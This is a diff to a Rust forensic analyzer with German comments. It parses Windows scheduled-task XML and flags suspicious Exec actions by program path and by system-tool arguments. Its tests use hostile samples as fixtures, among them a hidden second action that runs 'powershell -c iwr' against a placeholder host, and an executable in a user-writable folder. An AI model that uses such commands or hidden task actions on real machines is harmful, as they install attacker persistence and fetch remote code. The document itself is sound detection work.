@@ -7,6 +7,7 @@
 
 use stratum_ntfs::NtfsVolume;
 
+use crate::pathrating::{rate_command, PathStatus};
 use crate::{AnalysisContext, Analyzer, Finding, FsIndex, Outcome};
 
 /// Analyzer für geplante Aufgaben und Autostart-Ordner.
@@ -57,36 +58,47 @@ fn scheduled_tasks<R: std::io::Read + std::io::Seek>(
         if !text.contains("<Task") {
             continue;
         }
-        let command = tag(&text, "Command");
-        let arguments = tag(&text, "Arguments");
         let author = tag(&text, "Author");
         let user = tag(&text, "UserId");
-
-        // Bewertung und Erfassung bleiben getrennt: auch gewöhnliche Aufgaben
-        // und Aktionen ohne Exec-Befehl sind für die spätere Sichtung relevant.
-        let auffaellig = command
-            .as_deref()
-            .is_none_or(|cmd| crate::reg::ungewoehnlicher_pfad(cmd) || crate::reg::ist_lolbin(cmd));
+        let actions = task_actions(&text);
 
         // Der Aufgabenname ist der Pfad unter Tasks.
         let name = e.path.strip_prefix(prefix).unwrap_or(&e.path);
         let name = name.trim_start_matches('\\');
 
-        let befehl = match (&command, &arguments) {
-            (Some(cmd), Some(a)) => format!("{cmd} {a}"),
-            (Some(cmd), None) => cmd.clone(),
-            _ => String::new(),
-        };
         let mut fd = Finding::new("persistence", name, &e.path)
             .with("ort", "Aufgabe")
-            .with("befehl", befehl)
-            .with("auffaellig", if auffaellig { "ja" } else { "nein" })
+            .with("befehl", actions.exec.first().cloned().unwrap_or_default())
+            .with("aktion", actions.kind())
+            .with(
+                "auffaellig",
+                if actions.reasons.is_empty() {
+                    "nein"
+                } else {
+                    "ja"
+                },
+            )
             .with(
                 "bewertung",
                 "Pfadheuristik, kein Nachweis einer schädlichen Aktion",
             )
             .with("mft_record", e.mft_record.to_string())
             .with("volume_offset", v.target.offset.to_string());
+        if actions.exec.len() > 1 {
+            fd = fd.with("weitere_befehle", actions.exec[1..].join("\n"));
+        }
+        if !actions.com.is_empty() {
+            fd = fd.with("com_handler", actions.com.join(","));
+        }
+        if let Some(status) = actions.first_path {
+            fd = fd.with("pfad_status", status.label());
+        }
+        if actions.lolbin {
+            fd = fd.with("systemwerkzeug", "ja");
+        }
+        if !actions.reasons.is_empty() {
+            fd = fd.with("auffaellig_grund", actions.reasons.join(","));
+        }
         if let Some(a) = author {
             fd = fd.with("autor", a);
         }
@@ -123,6 +135,97 @@ fn startup_folders<R: std::io::Read + std::io::Seek>(
     }
 }
 
+/// Aktionen einer Aufgabe mit ihrer Bewertung.
+#[derive(Debug, Default)]
+pub(crate) struct TaskActions {
+    /// Exec-Aktionen als Programm und Argumente.
+    exec: Vec<String>,
+    /// ClassIds der ComHandler-Aktionen.
+    com: Vec<String>,
+    /// Pfadbewertung der ersten Exec-Aktion.
+    first_path: Option<PathStatus>,
+    /// Mindestens eine Exec-Aktion startet ein Systemwerkzeug.
+    lolbin: bool,
+    /// Gründe für die Markierung, ohne Duplikate.
+    reasons: Vec<String>,
+}
+
+impl TaskActions {
+    fn kind(&self) -> &'static str {
+        match (self.exec.is_empty(), self.com.is_empty()) {
+            (false, true) => "exec",
+            (true, false) => "com_handler",
+            (false, false) => "exec,com_handler",
+            (true, true) => "sonstige",
+        }
+    }
+}
+
+/// Liest alle Exec- und ComHandler-Aktionen. Aufgaben ohne Exec-Aktion sind
+/// meist ComHandler von Windows selbst und gelten nicht pauschal als auffällig.
+/// Systemwerkzeuge wie rundll32 sind in Windows-Aufgaben üblich; markiert wird
+/// nur ein ungewöhnlicher Programmpfad oder ein Werkzeug mit auffälligen Argumenten.
+pub(crate) fn task_actions(xml: &str) -> TaskActions {
+    let mut out = TaskActions::default();
+    for block in blocks(xml, "Exec") {
+        let Some(command) = tag(block, "Command") else {
+            continue;
+        };
+        let arguments = tag(block, "Arguments");
+        // Command enthält nur das Programm, Leerzeichen gehören also zum Pfad.
+        let program = command.trim().trim_matches('"');
+        let rating = rate_command(&format!(
+            "\"{program}\" {}",
+            arguments.as_deref().unwrap_or("")
+        ));
+        out.first_path.get_or_insert(rating.path);
+        out.lolbin |= rating.lolbin;
+        let mut reasons = Vec::new();
+        if let PathStatus::Unusual(grund) = rating.path {
+            reasons.push(format!("pfad:{grund}"));
+        }
+        if let (true, Some(grund)) = (rating.lolbin, rating.suspicious_args) {
+            reasons.push(format!("systemwerkzeug_argumente:{grund}"));
+        }
+        for r in reasons {
+            if !out.reasons.contains(&r) {
+                out.reasons.push(r);
+            }
+        }
+        out.exec.push(match arguments {
+            Some(a) => format!("{command} {a}"),
+            None => command,
+        });
+    }
+    out.com = blocks(xml, "ComHandler")
+        .into_iter()
+        .filter_map(|b| tag(b, "ClassId"))
+        .collect();
+    out
+}
+
+/// Liefert den Inhalt aller `<name>...</name>`-Blöcke, auch mit Attributen am Start-Tag.
+fn blocks<'a>(xml: &'a str, name: &str) -> Vec<&'a str> {
+    let open = format!("<{name}");
+    let close = format!("</{name}>");
+    let mut out = Vec::new();
+    let mut rest = xml;
+    while let Some(p) = rest.find(&open) {
+        let after = &rest[p + open.len()..];
+        // `<Exec` darf nicht `<ExecutionTimeLimit` treffen.
+        if !after.starts_with(['>', ' ', '\t', '\r', '\n']) {
+            rest = after;
+            continue;
+        }
+        let Some(gt) = after.find('>') else { break };
+        let body = &after[gt + 1..];
+        let Some(end) = body.find(&close) else { break };
+        out.push(&body[..end]);
+        rest = &body[end + close.len()..];
+    }
+    out
+}
+
 /// Dekodiert einen Text als UTF-16LE (mit BOM) oder sonst als UTF-8 (verlustarm).
 fn decode_text(data: &[u8]) -> String {
     if data.len() >= 2 && data[0] == 0xff && data[1] == 0xfe {
@@ -146,8 +249,21 @@ fn tag(xml: &str, name: &str) -> Option<String> {
     if inhalt.is_empty() {
         None
     } else {
-        Some(inhalt.to_string())
+        Some(unescape(inhalt))
     }
+}
+
+/// Löst die fünf vordefinierten XML-Entitäten auf; `&amp;` zuletzt, damit
+/// `&amp;quot;` nicht doppelt dekodiert wird.
+fn unescape(s: &str) -> String {
+    if !s.contains('&') {
+        return s.to_string();
+    }
+    s.replace("&quot;", "\"")
+        .replace("&apos;", "'")
+        .replace("&lt;", "<")
+        .replace("&gt;", ">")
+        .replace("&amp;", "&")
 }
 
 #[cfg(test)]
@@ -161,6 +277,74 @@ mod tests {
         assert_eq!(tag(xml, "Command").as_deref(), Some("C:\\evil.exe"));
         assert_eq!(tag(xml, "Arguments").as_deref(), Some("-x"));
         assert_eq!(tag(xml, "Author"), None);
+    }
+
+    #[test]
+    fn com_handler_ist_nicht_auffaellig() {
+        let xml = "<Task><Actions Context=\"Author\"><ComHandler>\
+                   <ClassId>{A6BA00FE-40E8-477C-B713-C64A14F18ADB}</ClassId>\
+                   </ComHandler></Actions></Task>";
+        let a = task_actions(xml);
+        assert_eq!(a.kind(), "com_handler");
+        assert_eq!(a.com, ["{A6BA00FE-40E8-477C-B713-C64A14F18ADB}"]);
+        assert!(a.reasons.is_empty());
+    }
+
+    #[test]
+    fn windows_aufgaben_aus_echtem_system() {
+        for (cmd, args) in [
+            (
+                r"%windir%\system32\rundll32.exe",
+                r"%windir%\system32\PcaSvc.dll,PcaPatchSdbTask",
+            ),
+            (
+                r"%windir%\system32\rundll32.exe",
+                "/d acproxy.dll,PerformAutochkOperations",
+            ),
+            ("BthUdTask.exe", "$(Arg0)"),
+            ("sc.exe", "config upnphost start= auto"),
+            (
+                r"%ProgramFiles%\Windows Defender\MpCmdRun.exe",
+                "Scan -ScheduleJob",
+            ),
+            (r#""%ProgramFiles%\Windows Media Player\wmpnscfg.exe""#, ""),
+            (
+                r"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe",
+                "/c",
+            ),
+        ] {
+            let xml = format!(
+                "<Task><Settings><ExecutionTimeLimit>PT1H</ExecutionTimeLimit></Settings>\
+                 <Actions><Exec><Command>{cmd}</Command><Arguments>{args}</Arguments></Exec></Actions></Task>"
+            );
+            let a = task_actions(&xml);
+            assert_eq!(a.exec.len(), 1, "{cmd}");
+            assert!(a.reasons.is_empty(), "{cmd}: {:?}", a.reasons);
+        }
+    }
+
+    #[test]
+    fn auffaellige_aufgaben() {
+        let xml = r"<Task><Actions><Exec><Command>%localappdata%\x\u.exe</Command></Exec></Actions></Task>";
+        assert_eq!(task_actions(xml).reasons, ["pfad:nutzerbeschreibbar"]);
+
+        // Zweite Aktion versteckt hinter einer harmlosen ersten, mit Entitäten.
+        let xml = "<Task><Actions><Exec><Command>C:\\Windows\\System32\\svchost.exe</Command></Exec>\
+                   <Exec><Command>powershell.exe</Command>\
+                   <Arguments>-c &quot;iwr https://x.invalid/a&quot;</Arguments></Exec></Actions></Task>";
+        let a = task_actions(xml);
+        assert_eq!(a.kind(), "exec");
+        assert_eq!(a.exec.len(), 2);
+        assert!(a.exec[1].contains("\"iwr"));
+        assert!(a.lolbin);
+        assert_eq!(a.reasons, ["systemwerkzeug_argumente:url"]);
+    }
+
+    #[test]
+    fn unvollstaendiges_xml() {
+        assert!(blocks("<Exec><Command>a", "Exec").is_empty());
+        assert!(blocks("<Exec", "Exec").is_empty());
+        assert_eq!(unescape("&amp;quot;"), "&quot;");
     }
 
     #[test]
